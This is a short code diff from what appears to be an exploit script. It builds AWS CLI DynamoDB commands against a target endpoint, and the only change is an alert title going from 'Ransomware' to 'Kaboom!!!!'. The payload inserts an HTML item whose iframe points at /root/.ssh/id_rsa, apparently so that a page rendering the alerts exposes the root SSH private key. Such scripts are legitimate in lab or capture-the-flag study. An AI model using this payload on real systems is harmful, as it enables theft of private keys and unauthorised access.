@@ -37,7 +37,7 @@ payload = f"aws dynamodb create-table \
 payload2 = """aws dynamodb put-item \
     --table-name alerts \
     --item '{
-        "title": {"S": "Ransomware"},
+        "title": {"S": "Kaboom!!!!"},
         "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}
       }' \
     --return-consumed-capacity TOTAL --endpoint-url """+target_url
